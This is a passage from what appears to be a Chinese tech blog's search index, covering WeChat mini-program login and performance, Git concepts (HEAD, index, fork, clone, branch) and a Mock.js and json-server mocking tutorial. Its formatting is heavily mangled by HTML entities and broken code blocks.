页面全部出栈，只留下新的页面\n\n","categories":["小程序"],"tags":["小程序"]},{"title":"小程序登录流程","url":"/2018/09/30/%E5%B0%8F%E7%A8%8B%E5%BA%8F+uniapp/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%99%BB%E5%BD%95%E6%B5%81%E7%A8%8B/","content":"一、背景传统的web开发实现登陆功能，一般的做法是输入账号密码、或者输入手机号及短信验证码进行登录\n服务端校验用户信息通过之后，下发一个代表登录态的 token 给客户端，以便进行后续的交互,每当token过期，用户都需要重新登录\n而在微信小程序中，可以通过微信官方提供的登录能力方便地获取微信提供的用户身份标识，快速建立小程序内的用户体系，从而实现登陆功能\n实现小程序用户体系主要涉及到openid和code的概念：\n\n调用wx.login()方法会生成code，将code作为参数传递给微信服务器指定接口，就可以获取用户的openid\n\n对于每个小程序，微信都会将用户的微信ID映射出一个小程序 openid，作为这个用户在这个小程序的唯一标识\n二、流程微信小程序登陆具体实现的逻辑如下图所示：\n\n\n通过 wx.login() 获取到用户的code判断用户是否授权读取用户信息，调用wx.getUserInfo 读取用户数据\n由于小程序后台授权域名无法授权微信的域名，所以需要自身后端调用微信服务器获取用户信息\n通过 wx.request() 方法请求业务方服务器，后端把 appid , appsecret 和 code 一起发送到微信服务器。 appid 和 appsecret 都是微信提供的，可以在管理员后台找到\n微信服务器返回了 openid 及本次登录的会话密钥 session_key\n后端从数据库中查找 openid ，如果没有查到记录，说明该用户没有注册，如果有记录，则继续往下走\nsession_key 是对用户数据进行加密签名的密钥。为了自身应用安全，session_key 不应该在网络上传输\n然后生成 session并返回给小程序\n小程序把 session 存到 storage 里面\n下次请求时，先从 storage 里面读取，然后带给服务端\n服务端对比 session 对应的记录，然后校验有效期\n\n更加详细的功能图如下所示：\n\n三、扩展实际业务中，我们还需要登录态是否过期，通常的做法是在登录态（临时令牌）中保存有效期数据，该有效期数据应该在服务端校验登录态时和约定的时间（如服务端本地的系统时间或时间服务器上的标准时间）做对比\n这种方法需要将本地存储的登录态发送到小程序的服务端，服务端判断为无效登录态时再返回需重新执行登录过程的消息给小程\n另一种方式可以通过调用wx.checkSession检查微信登陆态是否过期：\n\n如果过期，则发起完整的登录流程\n如果不过期，则继续使用本地保存的自定义登录态\n\n这种方式的好处是不需要小程序服务端来参与校验，而是在小程序端调用AP，流程如下所示：\n\n","categories":["小程序"],"tags":["小程序"]},{"title":"小程序应用速度提升","url":"/2018/11/02/%E5%B0%8F%E7%A8%8B%E5%BA%8F+uniapp/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E9%80%9F%E5%BA%A6%E6%8F%90%E5%8D%87/","content":"一、是什么小程序启动会常常遇到如下图场景：\n\n这是因为，小程序首次启动前，微信会在小程序启动前为小程序准备好通用的运行环境，如运行中的县城和一些基础库的初始化\n然后才开始进入启动状态，展示一个固定的启动界面，界面内包含小程序的图标、名称和加载提示图标。此时，微信会在背后完成几项工作：\n\n下载小程序代码包\n加载小程序代码包\n初始化小程序首页\n\n下载到的小程序代码包不是小程序的源代码，而是编译、压缩、打包之后的代码包\n整体流程如下图：\n\n二、手段围绕上图小程序的启动流程， 我们可以从加载、渲染两个纬度进行切入：\n加载提升体验最直接的方法是控制小程序包的大小，常见手段有如下：\n\n代码包的体积压缩可以通过勾选开发者工具中“上传代码时，压缩代码”选项\n及时清理无用的代码和资源文件\n减少资源包中的图片等资源的数量和大小（理论上除了小icon，其他图片资源从网络下载），图片资源压缩率有限\n\n并且可以采取分包加载的操作，将用户访问率高的页面放在主包里，将访问率低的页面放入子包里，按需加载\n当用户点击到子包的目录时，还是有一个代码包下载的过程，这会感觉到明显的卡顿，所以子包也不建议拆的太大，当然我们可以采用子包预加载技术，并不需要等到用户点击到子包页面后在下载子包\n\n渲染关于微信小程序首屏渲染优化的手段如下：\n\n请求可以在页面onLoad就加载，不需要等页面ready后在异步请求数据\n尽量减少不必要的https请求，可使用 getStorageSync() 及 setStorageSync() 方法将数据存储在本地\n可以在前置页面将一些有用的字段带到当前页，进行首次渲染（列表页的某些数据–&gt; 详情页），没有数据的模块可以进行骨架屏的占位\n\n在微信小程序中，提高页面的多次渲染效率主要在于正确使用setData：\n\n不要过于频繁调用setData，应考虑将多次setData合并成一次setData调用\n数据通信的性能与数据量正相关，因而如果有一些数据字段不在界面中展示且数据结构比较复杂或包含长字符串，则不应使用setData来设置这些数据\n与界面渲染无关的数据最好不要设置在data中，可以考虑设置在page对象的其他字段下\n\n除此之外，对于一些独立的模块我们尽可能抽离出来，这是因为自定义组件的更新并不会影响页面上其他元素的更新\n各个组件也将具有各自独立的逻辑空间。每个组件都分别拥有自己的独立的数据、setData调用\n三、总结小程序启动加载性能：\n\n控制代码包的大小\n分包加载\n首屏体验（预请求，利用缓存，避免白屏，及时反馈\n\n小程序渲染性能：\n\n避免不当的使用setData\n使用自定义组件\n\n","categories":["小程序"],"tags":["小程序"]},{"title":"Git 中 HEAD、工作树和索引之间的区别","url":"/2018/12/05/%E5%B7%A5%E5%85%B7/Git%20%E4%B8%AD%20HEAD%E3%80%81%E5%B7%A5%E4%BD%9C%E6%A0%91%E5%92%8C%E7%B4%A2%E5%BC%95%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB/","content":"一、HEAD在git中，可以存在很多分支，其本质上是一个指向commit对象的可变指针，而Head是一个特别的指针，是一个指向你正在工作中的本地分支的指针\n简单来讲，就是你现在在哪儿，HEAD 就指向哪儿\n例如当前我们处于master分支，所以HEAD这个指针指向了master分支指针\n\n然后通过调用git checkout test切换到test分支，那么HEAD则指向test分支，如下图：\n\n但我们在test分支再一次commit信息的时候，HEAD指针仍然指向了test分支指针，而test分支指针已经指向了最新创建的提交，如下图：\n\n这个HEAD存储的位置就在.git/HEAD目录中，查看信息可以看到HEAD指向了另一个文件\n$ cat .git/HEADref: refs/heads/master$ cat .git/refs/heads/master7406a10efcc169bbab17827aeda189aa20376f7f\n\n这个文件的内容是一串哈希码，而这个哈希码正是master分支上最新的提交所对应的哈希码\n所以，当我们切换分支的时候，HEAD指针通常指向我们所在的分支，当我们在某个分支上创建新的提交时，分支指针总是会指向当前分支的最新提交\n所以，HEAD指针 ——–&gt; 分支指针 ——–&gt; 最新提交\n二、工作树和索引在Git管理下，大家实际操作的目录被称为工作树，也就是工作区域\n在数据库和工作树之间有索引，索引是为了向数据库提交作准备的区域，也被称为暂存区域\n\nGit在执行提交的时候，不是直接将工作树的状态保存到数据库，而是将设置在中间索引区域的状态保存到数据库\n因此，要提交文件，首先需要把文件加入到索引区域中。\n所以，凭借中间的索引，可以避免工作树中不必要的文件提交，还可以将文件修改内容的一部分加入索引区域并提交\n三、区别从所在的位置来看：\n\nHEAD 指针通常指向我们所在的分支，当我们在某个分支上创建新的提交时，分支指针总是会指向当前分支的最新提交\n工作树是查看和编辑的（源）文件的实际内容\n索引是放置你想要提交给 git仓库文件的地方，如工作树的代码通过 git add 则添加到 git 索引中，通过git commit 则将索引区域的文件提交到 git 仓库中\n\n","categories":["工具"],"tags":["git"]},{"title":"Git中 fork, clone,branch","url":"/2018/12/20/%E5%B7%A5%E5%85%B7/Git%E4%B8%AD%20fork,%20clone,branch/","content":"一、是什么forkfork，英语翻译过来就是叉子，动词形式则是分叉，如下图，从左到右，一条直线变成多条直线\n\n转到git仓库中，fork则可以代表分叉、克隆 出一个（仓库的）新拷贝\n\n包含了原来的仓库（即upstream repository，上游仓库）所有内容，如分支、Tag、提交\n如果想将你的修改合并到原项目中时，可以通过的 Pull Request 把你的提交贡献回 原仓库\ncloneclone，译为克隆，它的作用是将文件从远程代码仓下载到本地，从而形成一个本地代码仓\n执行clone命令后，会在当前目录下创建一个名为xxx的目录，并在这个目录下初始化一个 .git 文件夹，然后从中读取最新版本的文件的拷贝\n默认配置下远程 Git 仓库中的每一个文件的每一个版本都将被拉取下来\nbranchbranch，译为分支，其作用简单而言就是开启另一个分支， 使用分支意味着你可以把你的工作从开发主线上分离开来，以免影响开发主线\nGit 处理分支的方式十分轻量，创建新分支这一操作几乎能在瞬间完成，并且在不同分支之间的切换操作也是一样便捷\n在我们开发中，默认只有一条master分支，如下图所示：\n\n通过git branch可以创建一个分支，但并不会自动切换到新分支中去\n\n通过git checkout可以切换到另一个testing分支\n\n二、如何使用fork当你在github发现感兴趣开源项目的时候，可以通过点击github仓库中右上角fork标识的按钮，如下图：\n\n点击这个操作后会将这个仓库的文件、提交历史、issues和其余东西的仓库复制到自己的github仓库中，而你本地仓库是不会存在任何更改\n然后你就可以通过git clone对你这个复制的远程仓库进行克隆\n后续更改任何东西都可以在本地完成，如git add、git commit一系列的操作，然后通过push命令推到自己的远程仓库\n如果希望对方接受你的修改，可以通过发送pull requests给对方，如果对方接受。则会将你的修改内容更新到仓库中\n\n整体流程如下图：\n\nclone在github中，开源项目右侧存在code按钮，点击后则会显示开源项目url信息，如下图所示：\n\n通过git clone xxx则能完成远程项目的下载\nbranch可通过git branch进行查看当前的分支状态，\n如果给了--list，或者没有非选项参数，现有的分支将被列出；当前的分支将以绿色突出显示，并标有星号\n以及通过git branch创建一个新的分支出来\n三、区别其三者区别如下：\n\nfork 只能对代码仓进行操作，且 fork 不属于 git 的命令，通常用于代码仓托管平台的一种“操作”\nclone 是 git 的一种命令，它的作用是将文件从远程代码仓下载到本地，从而形成一个本地代码仓\nbranch 特征与 fork 很类似，fork 得到的是一个新的、自己的代码仓，而 branch 得到的是一个代码仓的一个新分支\n\n","categories":["工具"],"tags":["git"]},{"title":"Mock","url":"/2019/01/04/%E5%B7%A5%E5%85%B7/Mock%E6%A8%A1%E6%8B%9F%E6%95%B0%E6%8D%AE/","content":"\n文章内容整理于互联网，方便学习\n\n一、学前预热\n为了做到前后端并行开发，数据mock就成为环境搭建的重要一环\n\n1.1 Web应用前后端分离\n后台向前台提供API接口,只负责数据的提供和计算，而完全不处理展现\n前台通过Http(Ajax)请求获取数据,　在浏览器端动态构建界面显示数据\n\n1.2 利用Node+express提供模拟数据\n优点：可以在浏览器端访问\n缺点：如果是打包发布就无法访问模拟数据, 只能是测试时使用\n\n\n修改build&#x2F;dev-server.js\n\n//加载json数据var apiData = require(&#x27;../src/mock/data.json&#x27;)var home = apiData.home;//得到路由器var apiRouter = express.Router()//注册路由apiRouter.get(&#x27;/home&#x27;, function (req, res) &#123;    res.json(&#123;      code: 0,   //0代表正确数据      data: seller    &#125;)&#125;)//启用路由app.use(&#x27;/api&#x27;, apiRouter)//访问http://localhost:8080/api/home\n\n1.3 利用mockjs提供模拟数据\nMockjs: 用来拦截ajax请求, 生成随机数据返回\n\n\n优点：不可以在浏览器端访问\n缺点：打包发布运行模拟接口也是可以用的\n\nimport Mock from &#x27;mockjs&#x27;  import apiData from &#x27;./data.json&#x27;Mock.mock(&#x27;/api2/seller&#x27;, &#123;code:0, data:apiData.seller&#125;)Mock.mock(&#x27;/api2/goods&#x27;, &#123;code:0, data:apiData.goods&#125;)Mock.mock(&#x27;/api2/ratings&#x27;, &#123;code:0, data:apiData.ratings&#125;)\n\n1.4 使用postman工具测试接口\npostman是用来测试API接口的chrome插件\npostman也是一个活接口文档\n\n1.5 ajax请求mock数据接口\nvue-resource是用于ajax请求的vue插件\naxios是浏览器&#x2F;服务器端通用的ajax请求库\n\n//使用示例import VueResource from &#x27;vue-resource&#x27; Vue.use(VueResource)//组件对象多了$http属性, 使用它发送ajax请求this.$http.get(&#x27;/api2/seller&#x27;).then((response) =&gt; &#123;  console.log(response.body)&#125;, (response) =&gt; &#123;  console.log(&#x27;失败了&#x27;)&#125;)import axios from &#x27;axios&#x27;  axios.get(&#x27;/api2/seller&#x27;).then((response) =&gt; &#123;  console.log(response.body)&#125;, (response) =&gt; &#123;  console.log(&#x27;失败了&#x27;)&#125;)\n\n二、数据mock思路\n在client端处数据mock\n在server端mock\n\n\n\n第一种方式拦截了请求的发出，直接返回mock的数据，而第二种方式请求则真实地发出，只是在server端进行route拦截\n前后端分离的方式，就是在传统开发模式中加了一个node层，这样数据mock完全可以在node server端完成，基本思路如下\n\n\n\n2.1 mock思路说明\n只有线下开发模式，才会需要进行数据mock\n根据请求的url，拼接形成一个file path\n为了避免node缓存，删除require.cache(path)\n读取require(path) ，如果该文件不存在或读取失败，则跳转到失败路由。这样简单的数据mock就实现了\n\n2.2 代码描述// 伪代码if (process.env.NODE_ENV === &#x27;development&#x27;) &#123;  router.set(&#x27;/api/*&#x27;, mockapi)&#125; function mockapi(req, res, opts) &#123;    var basePath = url.parse(req.url).pathname;             try &#123;        var findPath = require.resolve(prefixPath + basePath + &#x27;.js&#x27;);        delete require.cache[findPath]        var result = require(findPath);    &#125; catch (err) &#123;        return next(err);    &#125;    if (typeof result === &#x27;function&#x27;) &#123;        return result(req, res, opts);    &#125;    if (typeof result.status === &#x27;undefined&#x27; || typeof result.body === &#x27;undefined&#x27;) &#123;        next(new Error(&#x27;status 或 body 不存在&#x27;))        return;    &#125;    res.writeHead(result.status, &#123;        &#x27;Content-Type&#x27;: &#x27;application/json;charset=UTF-8&#x27;    &#125;);         res.write(JSON.stringify(result.body))    res.end();    cb()&#125;\n\n三、Mock.js使用详解3.1 Mock.js实现的功能\n让前端攻城师独立于后端进行开发\n通过随机数据，模拟各种场景\n不需要修改既有代码，就可以拦截 Ajax 请求，返回模拟的响应数据\n支持生成随机的文本、数字、布尔值、日期、邮箱、链接、图片、颜色等。\n\n3.2 Mock安装3.2.1 Node下使用# 安装npm install mockjs// 使用 Mockvar Mock = require(&#x27;mockjs&#x27;)var data = Mock.mock(&#123;    // 属性 list 的值是一个数组，其中含有 1 到 10 个元素    &#x27;list|1-10&#x27;: [&#123;        // 属性 id 是一个自增数，起始值为 1，每次增 1        &#x27;id|+1&#x27;: 1    &#125;]&#125;)// 输出结果console.log(JSON.stringify(data, null, 4))\n\n3.2.2 RequireJS (AMD)// 配置 Mock 路径require.config(&#123;    paths: &#123;        mock: &#x27;http://mockjs.com/dist/mock&#x27;    &#125;&#125;)// 加载 Mockrequire([&#x27;mock&#x27;], function(Mock)&#123;    // 使用 Mock    var data = Mock.mock(&#123;        &#x27;list|1-10&#x27;: [&#123;            &#x27;id|+1&#x27;: 1        &#125;]    &#125;)    // 输出结果    document.body.innerHTML +=        &#x27;&lt;pre&gt;&#x27; +        JSON.stringify(data, null, 4) +        &#x27;&lt;/pre&gt;&#x27;&#125;)\n\n3.3 使用语法\n&#96;&#96;&#96;Mock.js     的语法规范包括两部分  - 数据模板定义规范  - 数据占位符定义规范#### 3.3.1 数据模板定义规范- 数据模板中的每个属性由 3 部分构成：属性名、生成规则、属性值\n&#x2F;&#x2F; 属性名   name&#x2F;&#x2F; 生成规则 rule&#x2F;&#x2F; 属性值   value‘name|rule’: value- 属性名 和 生成规则 之间用竖线 `|` 分隔- 生成规则 是可选的- 生成规则 有 7 种格式  - `&#x27;name|min-max&#x27;: value`  - `&#x27;name|count&#x27;: value`  - `&#x27;name|min-max.dmin-dmax&#x27;: value`  - `&#x27;name|min-max.dcount&#x27;: value`  - `&#x27;name|count.dmin-dmax&#x27;: value`  - `&#x27;name|count.dcount&#x27;: value`  - `&#x27;name|+step&#x27;: value`- 生成规则 的 含义 需要依赖 属性值的类型 才能确定- 属性值 中可以含有 `@`占位符- 属性值 还指定了最终值的初始值和类型#### 3.3.2 生成规则和示例- 属性值是字符串 `String`  - ```    &#x27;name|min-max&#x27;: string\n\n\n通过重复 string生成一个字符串，重复次数大于等于min，小于等于 max\n\n&#39;name|count&#39;: string\n    - 通过重复 `string`生成一个字符串，重复次数等于 `count`。- 属性值是数字`Number`  - ```    &#x27;name|+1&#x27;: number\n\n- 属性值自动加 `1`，初始值为 `number`\n\n\n&#96;&#96;&#96;‘name|min-max’: number\n  - 生成一个大于等于 `min`、小于等于 `max`的整数，属性值 `number` 只是用来确定类型- ```  &#x27;name|min-max.dmin-dmax&#x27;: number\n\n\n生成一个浮点数，整数部分大于等于min、小于等于 max，小数部分保留 dmin 到 dmax 位\n\n\n\n\n\nMock.mock(&#123;    &#x27;number1|1-100.1-10&#x27;: 1,    &#x27;number2|123.1-10&#x27;: 1,    &#x27;number3|123.3&#x27;: 1,    &#x27;number4|123.10&#x27;: 1.123&#125;)// =&gt;&#123;    &quot;number1&quot;: 12.92,    &quot;number2&quot;: 123.51,    &quot;number3&quot;: 123.777,    &quot;number4&quot;: 123.1231091814&#125;\n\n\n属性值是布尔型 Boolean\n\n&#96;&#96;&#96;‘name|1’: boolean  - 随机生成一个布尔值，值为 `true` 的概率是 `1/2`，值为 `false` 的概率同样是 `1/2`- ```  &#x27;name|min-max&#x27;: value\n\n\n随机生成一个布尔值，值为 value 的概率是min / (min + max)，值为 !value的概率是 max / (min + max)\\\n\n\n\n\n属性值是对象 Object\n\n&#96;&#96;&#96;‘name|count’: object  - 从属性值 `object`中随机选取 `count`个属性- ```  &#x27;name|min-max&#x27;: object\n\n\n从属性值 object中随机选取 min 到 max 个属性\n\n\n\n\n属性值是数组 Array\n\n&#39;name|1&#39;: array\n  - 从属性值 `array` 中随机选取 `1`个元素，作为最终值- ```  &#x27;name|+1&#x27;: array\n\n- 从属性值 `array`中顺序选取 `1` 个元素，作为最终值\n\n\n&#96;&#96;&#96;‘name|min-max’: array\n  - 通过重复属性值`array` 生成一个新数组，重复次数大于等于 `min`，小于等于 `max`- ```  &#x27;name|count&#x27;: array\n\n\n通过重复属性值 array生成一个新数组，重复次数为 count\n\n\n\n\n属性值是函数 Function\n\n&#96;&#96;&#96;‘name’: function    - 执行函数 `function`，取其返回值作为最终的属性值，函数的上下文为属性 `&#x27;name&#x27;` 所在的对象- 属性值是正则表达式 `RegExp`  - ```    &#x27;name&#x27;: regexp\n\n\n根据正则表达式 regexp 反向生成可以匹配它的字符串。用于生成自定义格式的字符串\n\n\n\n\n\nMock.mock(&#123;    &#x27;regexp1&#x27;: /[a-z][A-Z][0-9]/,    &#x27;regexp2&#x27;: /\\w\\W\\s\\S\\d\\D/,    &#x27;regexp3&#x27;: /\\d&#123;5,10&#125;/&#125;)// =&gt;&#123;    &quot;regexp1&quot;: &quot;pJ7&quot;,    &quot;regexp2&quot;: &quot;F)\\fp1G&quot;,    &quot;regexp3&quot;: &quot;561659409&quot;&#125;\n\n3.3.3 数据占位符定义规范\n占位符,只是在属性值字符串中占个位置，并不出现在最终的属性值中\n\n\n占位符 的格式为\n\n@占位符@占位符(参数 [, 参数])\n\n\n用 @来标识其后的字符串是 占位符\n占位符 引用的是 Mock.Random 中的方法\n通过 Mock.Random.extend() 来扩展自定义占位符\n占位符 也可以引用 数据模板 中的属性\n占位符 会优先引用 数据模板 中的属性\n占位符 支持 相对路径 和 绝对路径\n\nMock.mock(&#123;    name: &#123;        first: &#x27;@FIRST&#x27;,        middle: &#x27;@FIRST&#x27;,        last: &#x27;@LAST&#x27;,        full: &#x27;@first @middle @last&#x27;    &#125;&#125;)// =&gt;&#123;    &quot;name&quot;: &#123;        &quot;first&quot;: &quot;Charles&quot;,        &quot;middle&quot;: &quot;Brenda&quot;,        &quot;last&quot;: &quot;Lopez&quot;,        &quot;full&quot;: &quot;Charles Brenda Lopez&quot;    &#125;&#125;\n\n3.4 Mock.mock()3.4.1 Mock.mock( template )\n根据数据模板生成模拟数据\n\n&lt;!-- （必选）加载 Mock --&gt;&lt;script src=&quot;http://mockjs.com/dist/mock.js&quot;&gt;&lt;/script&gt;// Mock.mock( template )var template = &#123;    &#x27;title&#x27;: &#x27;Syntax Demo&#x27;,    &#x27;string1|1-10&#x27;: &#x27;★&#x27;,    &#x27;string2|3&#x27;: &#x27;value&#x27;,    &#x27;number1|+1&#x27;: 100,    &#x27;number2|1-100&#x27;: 100,    &#x27;number3|1-100.1-10&#x27;: 1,    &#x27;number4|123.1-10&#x27;: 1,    &#x27;number5|123.3&#x27;: 1,    &#x27;number6|123.10&#x27;: 1.123,    &#x27;boolean1|1&#x27;: true,    &#x27;boolean2|1-2&#x27;: true,    &#x27;object1|2-4&#x27;: &#123;        &#x27;110000&#x27;: &#x27;北京市&#x27;,        &#x27;120000&#x27;: &#x27;天津市&#x27;,        &#x27;130000&#x27;: &#x27;河北省&#x27;,        &#x27;140000&#x27;: &#x27;山西省&#x27;    &#125;,    &#x27;object2|2&#x27;: &#123;        &#x27;310000&#x27;: &#x27;上海市&#x27;,        &#x27;320000&#x27;: &#x27;江苏省&#x27;,        &#x27;330000&#x27;: &#x27;浙江省&#x27;,        &#x27;340000&#x27;: &#x27;安徽省&#x27;    &#125;,    &#x27;array1|1&#x27;: [&#x27;AMD&#x27;, &#x27;CMD&#x27;, &#x27;KMD&#x27;, &#x27;UMD&#x27;],    &#x27;array2|1-10&#x27;: [&#x27;Mock.js&#x27;],    &#x27;array3|3&#x27;: [&#x27;Mock.js&#x27;],    &#x27;function&#x27;: function() &#123;        return this.title    &#125;&#125;var data = Mock.mock(template)$(&#x27;&lt;pre&gt;&#x27;).text(JSON.stringify(data, null, 4))    .appendTo(&#x27;body&#x27;)//res&#123;    &quot;title&quot;: &quot;Syntax Demo&quot;,    &quot;string1&quot;: &quot;★★★&quot;,    &quot;string2&quot;: &quot;valuevaluevalue&quot;,    &quot;number1&quot;: 100,    &quot;number2&quot;: 48,    &quot;number3&quot;: 99.05,    &quot;number4&quot;: 123.6,    &quot;number5&quot;: 123.516,    &quot;number6&quot;: 123.1236370317,    &quot;boolean1&quot;: false,    &quot;boolean2&quot;: true,    &quot;object1&quot;: &#123;        &quot;120000&quot;: &quot;天津市&quot;,        &quot;130000&quot;: &quot;河北省&quot;    &#125;,    &quot;object2&quot;: &#123;        &quot;320000&quot;: &quot;江苏省&quot;,        &quot;330000&quot;: &quot;浙江省&quot;    &#125;,    &quot;array1&quot;: &quot;KMD&quot;,    &quot;array2&quot;: [        &quot;Mock.js&quot;    ],    &quot;array3&quot;: [        &quot;Mock.js&quot;,        &quot;Mock.js&quot;,        &quot;Mock.js&quot;    ],    &quot;function&quot;: &quot;Syntax Demo&quot;&#125;\n\n3.4.2 Mock.mock( rurl, template )\n记录数据模板。当拦截到匹配 rurl 的 Ajax 请求时，将根据数据模板 template生成模拟数据，并作为响应数据返回\n\n&lt;!-- （必选）加载 Mock --&gt;&lt;script src=&quot;http://mockjs.com/dist/mock.js&quot;&gt;&lt;/script&gt;// Mock.mock(rurl, template)Mock.mock(/\\.json/, &#123;    &#x27;list|1-10&#x27;: [&#123;        &#x27;id|+1&#x27;: 1,        &#x27;email&#x27;: &#x27;@EMAIL&#x27;    &#125;]&#125;)$.ajax(&#123;    url: &#x27;1.json&#x27;,    dataType: &#x27;json&#x27;&#125;).done(function(data, status, jqXHR)&#123;    $(&#x27;&lt;pre&gt;&#x27;).text(JSON.stringify(data, null, 4))        .appendTo(&#x27;body&#x27;)&#125;)&#123;    &quot;list&quot;: [        &#123;            &quot;id&quot;: 1,            &quot;email&quot;: &quot;k.sejuwxvego@xcwc.中国互联.公司&quot;        &#125;,        &#123;            &quot;id&quot;: 2,            &quot;email&quot;: &quot;f.hjns@rhivyrvhpb.ve&quot;        &#125;,        &#123;            &quot;id&quot;: 3,            &quot;email&quot;: &quot;g.bdwuuhm@czoybmyp.ms&quot;        &#125;,        &#123;            &quot;id&quot;: 4,            &quot;email&quot;: &quot;n.tkgs@javvkxz.bf&quot;        &#125;    ]&#125;\n\n3.4.3 Mock.mock( rurl, function( options ) )\n记录用于生成响应数据的函数。当拦截到匹配 rurl 的 Ajax 请求时，函数 function(options)将被执行，并把执行结果作为响应数据返回\n\n// Mock.mock(rurl, function(options))Mock.mock(/\\.json/, function(options) &#123;    return options&#125;)$.ajax(&#123;    url: &#x27;hello.json&#x27;,    dataType: &#x27;json&#x27;&#125;).done(function(data, status, jqXHR) &#123;    $(&#x27;&lt;pre&gt;&#x27;).text(JSON.stringify(data, null, 4))        .appendTo(&#x27;body&#x27;)&#125;)$.ajax(&#123;    url: &#x27;hello.json&#x27;,    dataType: &#x27;json&#x27;,    data: &#123;        foo: 1,        bar: 2,        faz: 3    &#125;&#125;).done(function(data, status, jqXHR) &#123;    $(&#x27;&lt;pre&gt;&#x27;).text(JSON.stringify(data, null, 4))        .appendTo(&#x27;body&#x27;)&#125;)$.ajax(&#123;    url: &#x27;hello.json&#x27;,    type: &#x27;post&#x27;,    dataType: &#x27;json&#x27;,    data: &#123;        foo: 1,        bar: 2,        faz: 3    &#125;&#125;).done(function(data, status, jqXHR) &#123;    $(&#x27;&lt;pre&gt;&#x27;).text(JSON.stringify(data, null, 4))        .appendTo(&#x27;body&#x27;)&#125;)&#123;    &quot;url&quot;: &quot;hello.json?foo=1&amp;bar=2&amp;faz=3&quot;,    &quot;type&quot;: &quot;GET&quot;,    &quot;body&quot;: null&#125;&#123;    &quot;url&quot;: &quot;hello.json&quot;,    &quot;type&quot;: &quot;GET&quot;,    &quot;body&quot;: null&#125;&#123;    &quot;url&quot;: &quot;hello.json&quot;,    &quot;type&quot;: &quot;POST&quot;,    &quot;body&quot;: &quot;foo=1&amp;bar=2&amp;faz=3&quot;&#125;\n\n3.4.4 Mock.setup()\n&#96;&#96;&#96;Mock.setup( settings )  - 配置拦截 `Ajax` 请求时的行为。支持的配置项有：`timeout`&gt; 指定被拦截的 `Ajax` 请求的响应时间，单位是毫秒。值可以是正整数，例如 `400`，表示 `400` 毫秒 后才会返回响应内容；也可以是横杠 `&#x27;-&#x27;` 风格的字符串，例如 `&#x27;200-600&#x27;`，表示响应时间介于 `200` 和 `600` 毫秒之间。默认值是`&#x27;10-100&#x27;`\nMock.setup({  timeout: 400})Mock.setup({  timeout: ‘200-600’})- 目前，接口 `Mock.setup( settings )`仅用于配置 `Ajax` 请求#### 3.4.5 Mock.Random- `Mock.Random` 是一个工具类，用于生成各种随机数据- `Mock.Random`的方法在数据模板中称为『占位符』，书写格式为 `@`占位符(参数 [, 参数])\nvar Random &#x3D; Mock.RandomRandom.email()&#x2F;&#x2F; &#x3D;&gt; “&#110;&#46;&#99;&#108;&#x61;&#x72;&#107;&#64;&#x6d;&#x69;&#108;&#x6c;&#x65;&#x72;&#x2e;&#105;&#x6f;“Mock.mock(‘@email’)&#x2F;&#x2F; &#x3D;&gt; “&#121;&#46;&#x6c;&#x65;&#x65;&#x40;&#x6c;&#x65;&#x77;&#x69;&#x73;&#x2e;&#111;&#114;&#103;“Mock.mock( { email: ‘@email’ } )&#x2F;&#x2F; &#x3D;&gt; { email: “&#118;&#46;&#x6c;&#x65;&#119;&#105;&#x73;&#64;&#x68;&#x61;&#x6c;&#x6c;&#46;&#x67;&#111;&#118;“ }## 四、简单构建一套mock-server&gt; 为了更好的分工合作，让前端能在不依赖后端环境的情况下进行开发，其中一种手段就是为前端开发者提供一个 web 容器，这个本地环境就是 mock-server**一个比较好的 mock-server 该有的能力**- 与线上环境一致的接口地址，每次构建前端代码时不需要修改调用接口的代码- 所改即所得，具有热更新的能力，每次增加修改 `mock` 接口时不需要重启 `mock` 服务，更不用重启前端构建服务- 能配合 `Webpack`- `mock` 数据可以由工具生成不需要自己手动写- 能模拟 `POST`、`GET` 请求**搭建主要思路**&gt; 以 `json-server` 作为 `mock` 服务器， `mock.js` 生成`mock` 数据，利用 `gulp + nodemon + browser-sync` 监听`mock`文件的改动重启 `node` 服务，刷新浏览器，以此达到一种相对完美的 `mock-server`要求### 4.1 json-server 搭配 mock.js- 这里以`Webpack` 的前端工程为例\ncnpm install json-server mockjs –save- 在项目根目录新建 `mock`文件夹，新建 `mock/db.js` 作为 `mock` 数据源，`mock/server.js`作为 `mock`服务，`mock/routes.js`重写路由表\nvar Mock &#x3D; require(‘mockjs’);\n\nmodule.exports &#x3D; {  getComment: Mock.mock({    “error”: 0,    “message”: “success”,    “result|40”: [{      “author”: “@name”,      “comment”: “@cparagraph”,      “date”: “@datetime”    }]  }),  addComment: Mock.mock({    “error”: 0,    “message”: “success”,    “result”: []  })};\n- 这里我们利用 `mock.js` 生成 `mock` 数据，可以尽可能的还原真实数据，还可以减少数据构造的复杂度\n&#x2F;&#x2F; routes.jsmodule.exports &#x3D; {  “&#x2F;comment&#x2F;get.action”: “&#x2F;getComment”,  “&#x2F;comment&#x2F;add.action”: “&#x2F;addComment”}&#x2F;&#x2F; server.jsconst jsonServer &#x3D; require(‘json-server’)const db &#x3D; require(‘.&#x2F;db.js’)const routes &#x3D; require(‘.&#x2F;routes.js’)const port &#x3D; 3000;\nconst server &#x3D; jsonServer.create()const router &#x3D; jsonServer.router(db)const middlewares &#x3D; jsonServer.defaults()const rewriter &#x3D; jsonServer.rewriter(routes)\nserver.use(middlewares)&#x2F;&#x2F; 将 POST 请求转为 GETserver.use((request, res, next) &#x3D;&gt; {  request.method &#x3D; ‘GET’;  next();})\nserver.use(rewriter) &#x2F;&#x2F; 注意：rewriter 的设置一定要在 router 设置之前server.use(router)\nserver.listen(port, () &#x3D;&gt; {  console.log(‘open mock server at localhost:’ + port)})\n- 启动服务\n$ node mock&#x2F;server.js\n- 打开 `http://localhost:3000/comment/get.action`即可查看到我们想要的数据![image.png](http://upload-images.jianshu.io/upload_images/1480597-7c4747bf268572ad.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)&gt; 是不是这样就算搭建完了我们的 `mock-server` ？不，并没有。我们可以尝试修改一下 `db.js` 的文件内容，刷新浏览器发现 `mock` 数据并没有像我们想象的那样修改。那也就是说每次当我们需要添加 /修改 `mock` 数据使都需要重启一次 `mock` 服务### 4.2 端口代理&gt; 通过 `Webpack` 配置 `proxy` 代理\nmodule.exports &#x3D; {\n  devServer: {    &#x2F;&#x2F;其实很简单的，只要配置这个参数就可以了    proxy: {      ‘&#x2F;api&#x2F;‘: {        target: ‘http://localhost:3000&#39;,          changeOrigin: true,        pathRewrite: {          ‘^&#x2F;api’: ‘’        }      }    }  }}\n- 